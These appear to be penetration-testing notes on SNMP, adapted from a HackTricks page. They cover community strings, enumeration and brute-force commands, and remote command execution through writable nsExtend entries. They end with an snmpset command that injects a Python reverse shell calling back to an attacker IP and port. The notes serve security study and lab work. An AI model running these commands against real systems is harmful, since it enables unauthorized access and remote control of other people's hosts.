# Simple Network Management Protocol (SNMP)

## Resource: https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp

### SNMP - Simple Network Management Protocol is a protocol used to monitor different devices in the network (like routers, switches, printers, IoTs...).

### Port: 161/162 UDP, 10161/10162 UDP if TLS is used

## SNMP Versions

### There are 2 important versions of SNMP:

#### 1) SNMPv1

 - Main one, it is still the most frequent, the authentication is based on a string (community string) that travels in plain-text (all the information travels in plain text). Version 2 and 2c send the traffic in plain text also and uses a community string as authentication.

#### 2) SNMPv3

 - Uses a better authentication form and the information travels encrypted using (dictionary attack could be performed but would be much harder to find the correct creds than in SNMPv1 and v2).

## Community Strings

### As mentioned before, in order to access the information saved on the MIB you need to know the community string on versions 1 and 2/2c and the credentials on version 3.

### The are 2 types of community strings:

#### 1) Public: Mainly read only functions

#### 2) Private: Read/Write in general

### Note that the writability of an OID depends on the community string used, so even if you find that "public" is being used, you could be able to write some values. Also, there may exist objects which are always "Read Only".

### If you try to write an object a  noSuchName or readOnly error is received**.**

### In versions 1 and 2/2c if you to use a bad community string the server wont respond. So, if it responds, a valid community strings was used.

## Enumeration

### It is recommanded to install the following to see whats does mean each OID gathered from the device:

 - apt-get install snmp-mibs-downloader

 - download-mibs

# Finally comment the line saying "mibs :" in /etc/snmp/snmp.conf

 - sudo vi /etc/snmp/snmp.conf

### If you know a valid community string, you can access the data using SNMPWalk or SNMP-Check:

 - snmpbulkwalk -c [COMM_STRING] -v [VERSION] [IP] . #Don't forget the final dot

 - snmpbulkwalk -c public -v2c 10.10.11.136 .

 - snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP]

 - snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP] 1.3.6.1.2.1.4.34.1.3 #Get IPv6, needed dec2hex

 - snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP] NET-SNMP-EXTEND-MIB::nsExtendObjects #get extended

 - snmpwalk -v [VERSION_SNMP] -c [COMM_STRING] [DIR_IP] .1 #Enum all

 - snmp-check [DIR_IP] -p [PORT] -c [COMM_STRING]

 - nmap --script "snmp* and not snmp-brute" <target>

 - braa <community string>@<IP>:.1.3.6.* #Bruteforce specific OID

### Thanks to extended queries (download-mibs), it is possible to enumerate even more about the system with the following command :

 - snmpwalk -v X -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull

### SNMP has a lot of information about the host and things that you may find interesting are:

 - Network interfaces (IPv4 and IPv6 address)

 - Usernames

 - Uptime

 - Server/OS Version

 - Processes running (may contain passwords)

## Dangerous Settings

### In the realm of network management, certain configurations and parameters are key to ensuring comprehensive monitoring and control.

## Access Settings

### Two main settings enable access to the full OID tree, which is a crucial component in network management:

#### 1) rwuser noauth

 - It is set to permit full access to the OID tree without the need for authentication. This setting is straightforward and allows for unrestricted access.

#### 2) rwcommunity, rwcommunity6

### Both commands require a community string and the relevant IP address, offering full access irrespective of the request's origin.

## SNMP Parameters for Microsoft Windows

### A series of Management Information Base (MIB) values are utilized to monitor various aspects of a Windows system through SNMP:

 - System Processes: Accessed via 1.3.6.1.2.1.25.1.6.0, this parameter allows for the monitoring of active processes within the system.

 - Running Programs: The 1.3.6.1.2.1.25.4.2.1.2 value is designated for tracking currently running programs.

 - Processes Path: To determine where a process is running from, the 1.3.6.1.2.1.25.4.2.1.4 MIB value is used.

 - Storage Units: The monitoring of storage units is facilitated by 1.3.6.1.2.1.25.2.3.1.4.

 - Software Name: To identify the software installed on a system, 1.3.6.1.2.1.25.6.3.1.2 is employed.

 - User Accounts: The 1.3.6.1.4.1.77.1.2.25 value allows for the tracking of user accounts.

 - TCP Local Ports: Finally, 1.3.6.1.2.1.6.13.1.3 is designated for monitoring TCP local ports, providing insight into active network connections.

## SNMP Configuration files

 - snmp.conf

 - snmpd.conf

 - snmp-config.xml

## SNMP RCE

### SNMP can be exploited by an attacker if the administrator overlooks its default configuration on the device or server. By abusing SNMP community with write permissions (rwcommunity) on a Linux operating system, the attacker can execute commands on the server.

#### 1) Extending services with additional commands

### To extend SNMP services and add extra commands, it is possible to append new rows to the "nsExtendObjects" table. This can be achieved by using the snmpset command and providing the necessary parameters, including the absolute path to the executable and the command to be executed:

snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \

'nsExtendStatus."evilcommand"' = createAndGo \

'nsExtendCommand."evilcommand"' = /bin/echo \

'nsExtendArgs."evilcommand"' = 'hello world'

#### 2) Injecting commands for execution

### Injecting commands to run on the SNMP service requires the existence and executability of the called binary/script. The NET-SNMP-EXTEND-MIB mandates providing the absolute path to the executable.

### To confirm the execution of the injected command, the snmpwalk command can be used to enumerate the SNMP service. The output will display the command and its associated details, including the absolute path:

 - snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects

#### 3) Running the injected commands

### When the injected command is read, it is executed. This behavior is known as run-on-read() The execution of the command can be observed during the snmpwalk read.

## Shell with SNMP https://github.com/mxrch/snmp-shell

### Alternatively, a reverse shell can be manually created by injecting a specific command into SNMP. This command, triggered by the snmpwalk, establishes a reverse shell connection to the attacker's machine, enabling control over the victim machine. You can install the pre-requisite to run this:

 - sudo apt install snmp snmp-mibs-downloader rlwrap -y

 - git clone https://github.com/mxrch/snmp-shell

 - cd snmp-shell

 - sudo python3 -m pip install -r requirements.txt

### Or a reverse shell

 - snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
